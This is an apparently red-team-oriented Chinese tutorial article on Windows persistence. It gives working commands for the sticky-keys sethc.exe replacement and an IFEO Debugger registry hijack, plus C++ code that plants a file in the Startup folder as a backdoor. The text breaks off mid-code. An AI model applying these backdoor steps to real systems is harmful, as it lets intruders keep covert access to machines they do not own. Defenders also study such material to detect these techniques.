<html>
<head>
<title>干货最全Windows权限维持总结</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
干货 | 最全Windows权限维持总结
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                <span id="copyright_logo" class="rich_media_meta icon_appmsg_tag appmsg_title_tag weui-wa-hotarea">原创</span>
                                                                                            <span class="rich_media_meta rich_media_meta_text">
                                                                    Buffer
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2021-07-03</em>
                </div>

                
                                                                                                                                                                                                                        <div id="js_tags"  class="article-tag__list" data-len="3">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                                                                <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1928066062302937090#wechat_redirect" data-tag_id="" data-album_id="1928066062302937090"  data-tag_source="0">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>内网渗透</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>20</span>
                                                                            </div>
                                                                    <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1940187641413468160#wechat_redirect" data-tag_id="" data-album_id="1940187641413468160"  data-tag_source="0">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>权限维持</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>4</span>
                                                                            </div>
                                                                    <div role="link" class="article-tag__item-wrp js_tag weui-wa-hotarea" data-url="https://mp.weixin.qq.com/mp/appmsgalbum?__biz=MzI5MDU1NDk2MA==&amp;action=getalbum&amp;album_id=1923394661373542405#wechat_redirect" data-tag_id="" data-album_id="1923394661373542405"  data-tag_source="0">
                                        <span class="article-tag__item"><span aria-hidden="true">#</span>红队攻防</span>
                                                                                    <span class="article-tag__item-num"><span class="weui-hidden_abs">,</span>2</span>
                                                                            </div>
                                                                                    </div>
                                    </div><div id="weixin_content"><section style="line-height: 1.75em;" data-mpa-powered-by="yiban.io"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>0x01 前言</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><br  /></strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">红队人员拿到一台主机权限后首先会考虑将该机器作为一个持久化的据点，种植一个具备持久化的后门，从而随时可以连接该被控机器进行深入渗透。通俗的说抓到一条鱼,不能轻易放走了。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><br  /></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>0x02 辅助功能镜像劫持</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><br  /></strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;为了使电脑更易于使用和访问，Windows 添加了一些辅助功能。这些功能可以在用户登录之前以组合键启动。根据这个特征，一些恶意软件无需登录到系统，通过远程桌面协议就可以执行恶意代码。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">比如最常见的按5下shift出现的粘滞键Sethc.exe，还有Windows + U组合键时启动的utilman.exe程序</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">还有:</span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer">屏幕键盘：<span class="code-snippet__selector-tag">C</span>:\<span class="code-snippet__selector-tag">Windows</span>\<span class="code-snippet__selector-tag">System32</span>\<span class="code-snippet__selector-tag">osk</span><span class="code-snippet__selector-class">.exe</span></span></code><code><span class="code-snippet_outer">放大镜：<span class="code-snippet__selector-tag">C</span>:\<span class="code-snippet__selector-tag">Windows</span>\<span class="code-snippet__selector-tag">System32</span>\<span class="code-snippet__selector-tag">Magnify</span><span class="code-snippet__selector-class">.exe</span></span></code><code><span class="code-snippet_outer">旁白：<span class="code-snippet__selector-tag">C</span>:\<span class="code-snippet__selector-tag">Windows</span>\<span class="code-snippet__selector-tag">System32</span>\<span class="code-snippet__selector-tag">Narrator</span><span class="code-snippet__selector-class">.exe</span></span></code><code><span class="code-snippet_outer">显示切换器 <span class="code-snippet__selector-tag">C</span>:\<span class="code-snippet__selector-tag">Windows</span>\<span class="code-snippet__selector-tag">System32</span>\<span class="code-snippet__selector-tag">DisplaySwitch</span><span class="code-snippet__selector-class">.exe</span></span></code><code><span class="code-snippet_outer">应用切换器：<span class="code-snippet__selector-tag">C</span>:\<span class="code-snippet__selector-tag">Windows</span>\<span class="code-snippet__selector-tag">System32</span>\<span class="code-snippet__selector-tag">AtBroker</span><span class="code-snippet__selector-class">.exe</span></span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">在较早的 Windows 版本，只需要进行简单的二进制文件替换，比如经典的shift后门是将C:\Windows\System32\sethc.exe替换为cmd.exe。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>windows 2003，XP</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">可以可视化界面更换也可以命令行:</span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li></ul><pre class="code-snippet__js" data-lang="css"><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">copy</span> <span class="code-snippet__selector-tag">c</span>:\<span class="code-snippet__selector-tag">windows</span>\<span class="code-snippet__selector-tag">system32</span>\<span class="code-snippet__selector-tag">sethc</span><span class="code-snippet__selector-class">.ex</span> <span class="code-snippet__selector-tag">c</span>:\<span class="code-snippet__selector-tag">windows</span>\<span class="code-snippet__selector-tag">system32</span>\<span class="code-snippet__selector-tag">sethc1</span><span class="code-snippet__selector-class">.exe</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__selector-tag">copy</span> <span class="code-snippet__selector-tag">c</span>:\<span class="code-snippet__selector-tag">windows</span>\<span class="code-snippet__selector-tag">system32</span>\<span class="code-snippet__selector-tag">cmd</span><span class="code-snippet__selector-class">.exe</span> <span class="code-snippet__selector-tag">c</span>:\<span class="code-snippet__selector-tag">windows</span>\<span class="code-snippet__selector-tag">system32</span>\<span class="code-snippet__selector-tag">sethc</span><span class="code-snippet__selector-class">.exe</span></span></code></pre></section><section style="line-height: 1.75em;"><img data-ratio="0.29103053435114506" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/1_O5ricWQEHvm65PyxGc9Vsg2DGEQtng.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0quMLrniathqaH3QMt4aNt6kCI3O5ricWQEHvm65PyxGc9Vsg2DGEQtng/640?wx_fmt=png'" data-type="png" data-w="1048"  /><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;</span><img data-ratio="0.5259365994236311" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/2_Bx0Gs2dLdGwHZNqEnne7kFuxLvEhCA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0kevkAOg8h8T1fUibJQraxMicctBx0Gs2dLdGwHZNqEnne7kFuxLvEhCA/640?wx_fmt=png'" data-type="png" data-w="1388"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">&nbsp;</span><strong style="font-size:15px;line-height:35px;;letter-spacing: 1px;">更高版本</strong></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">我们需要用到IFEO,即映像劫持</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>什么是IFEO</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">所谓的IFEO就是Image File Execution Options，直译过来就是映像劫持。它又被称为“重定向劫持”（Redirection Hijack），它和“映像劫持”（Image Hijack，或IFEO Hijack）只是称呼不同，实际上都是一样的技术手段。白话来讲就是做某个操作的时候被拦截下来，干了别的事。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">当我们双击运行程序时，系统会查询该IFEO注册表，如果发现存在和该程序名称完全相同的子键，就查询对应子健中包含的“debugger”键值名，如果该参数不为空，系统则会把 Debugger 参数里指定的程序文件名作为用户试图启动的程序执行请求来处理。这样成功执行的是遭到“劫持”的虚假程序。</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>可视化修改</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">在iexplorer.exe中加入键值对:debugger&nbsp; c:\windows\system32\cmd.exe</span></section><section style="line-height: 1.75em;"><img data-ratio="0.9874739039665971" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/3_hlPIqMUibWmJI8Lu12JBNYCiaJTiaQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0vXL5jjCCvcibBAN3CLZlKYD9dhexhlPIqMUibWmJI8Lu12JBNYCiaJTiaQ/640?wx_fmt=png'" data-type="png" data-w="958"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>命令行修改</strong></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="cs"><code><span class="code-snippet_outer">reg <span class="code-snippet__keyword">add</span> <span class="code-snippet__string">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe"</span> /v <span class="code-snippet__string">"Debugger"</span> /t REG_SZ /d <span class="code-snippet__string">"c:\windows\system32\cmd.exe"</span> /f</span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><img data-ratio="0.4102941176470588" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/4_oO36iaDCTOj3gZaeVIR9nMW8EZyiag.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0UEicEtnAoeQ3xxnrawu5Z4mJZKdoO36iaDCTOj3gZaeVIR9nMW8EZyiag/640?wx_fmt=png'" data-type="png" data-w="1360"  /></strong></span><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">当然,需要管理员权限</span><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><br  /></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>0x03 启动项/服务后门</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong><br  /></strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"><strong>开始菜单启动项</strong></span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">开始菜单启动项，指示启动文件夹的位置，具体的位置是“开始”菜单中的“所有程序”-“启动”选项：</span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li></ul><pre class="code-snippet__js" data-lang="sql"><code><span class="code-snippet_outer">C:\Users\SD\AppData\Roaming\Microsoft\Windows\<span class="code-snippet__keyword">Start</span> Menu\Programs\<span class="code-snippet__keyword">Startup</span></span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">相关键值</span><br  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="properties"><code><span class="code-snippet_outer"><span class="code-snippet__attr">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User</span>   <span class="code-snippet__string">Shell Folders</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell</span>   <span class="code-snippet__string">Folders</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell</span>   <span class="code-snippet__string">Folders</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__attr">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User</span>   <span class="code-snippet__string">Shell Folders</span></span></code></pre></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span><br  /></section><section style="line-height: 1.75em;"><img data-ratio="0.7421981004070556" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/5_7ehDCay8WP26BwcyLTbMhSwdx76uBA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0v3oG6hk6mQXiczoTxiclq99nmic7ehDCay8WP26BwcyLTbMhSwdx76uBA/640?wx_fmt=png'" data-type="png" data-w="737"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">重启后自启</span><br  /></section><section style="line-height: 1.75em;"><img data-ratio="0.6614048934490924" src="图片/HACK学习呀_2021-07-03_干货最全Windows权限维持总结/6_Hmn5M7vvcPpxaLibbqXVzg53BVjgNw.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou9O3K1gCp1h3YHth6nSsbl0L1dfoiaeicmUq6Giav4oDqWnMX4oHmn5M7vvcPpxaLibbqXVzg53BVjgNw/640?wx_fmt=png'" data-type="png" data-w="1267"  /></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;">由于每台电脑的快速启动目录不同,可以代码实现</span></section><section style="line-height: 1.75em;"><span style="font-size:15px;line-height:35px;;letter-spacing: 1px;"></span></section><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cpp"><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;iostream&gt;</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;windows.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span>   <span class="code-snippet__meta-string">&lt;shlobj.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">pragma</span>   comment(lib, <span class="code-snippet__meta-string">"shell32.lib"</span>)</span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function">BOOL <span class="code-snippet__title">AutoRun_Startup</span><span class="code-snippet__params">(CHAR* lpszSrcFilePath, CHAR* lpszDestFileName)</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">BOOL ret = <span class="code-snippet__literal">false</span>;</span></code><code><span class="code-snippet_outer">CHAR szStartPath[MAX_PATH] = { <span class="code-snippet__number">0</span> };</span></code><code><span class="code-snippet_outer">CHAR szDestFilePath[MAX_PATH] = { <span class="code-snippet__number">0</span> };</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">//返回快速启动目录路径到szStartPath</span></span></code><code><span class="code-snippet_outer">ret = ::SHGetSpecialFolderPathA(<span class="code-snippet__literal">NULL</span>, szStartPath,CSIDL_STARTUP,TRUE);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">//判断是否获取成功</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (ret == TRUE)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[+]Get the quick start directory successfully！\n"</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">else</span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[!]Get the quick start directory faild！\n"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> FALSE;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">//构造文件在快速启动目录下的路径</span></span></code><code><span class="code-snippet_outer">::wsprintfA(szDestFilePath,<span class="code-snippet__string">"%s\\%s"</span>,szStartPath,lpszDestFileName);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment">//复制文件到快速启动目录下</span></span></code><code><span class="code-snippet_outer">ret = ::CopyFileA(lpszSrcFilePath, szDestFilePath, FALSE);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (FALSE == ret)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[!]Failed to save the file in the quick start directory.\n"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> FALSE;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">else</span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[!]Successfully to save the file in the quick start directory.\n"</span>);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[+]Backdoor generation in quick start directory successful!\n"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">return</span> TRUE;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">int</span> <span class="code-snippet__title">main</span><span class="code-snippet__params">(<span class="code-snippet__keyword">int</span> argc, <span class="code-snippet__keyword">char</span>* argv[])</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[*]Useage:\n    %s %s %s\n"</span>, <span class="code-snippet__string">"Run_StartUp.exe"</span>, <span class="code-snippet__string">"E:\\010Editor\\010 Editor\\010Editor.exe"</span>, <span class="code-snippet__string">"010Editor.exe"</span>);</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">if</span> (argc == <span class="code-snippet__number">3</span>)</span></code><code><span class="code-snippet_outer">{</span></code><code><span 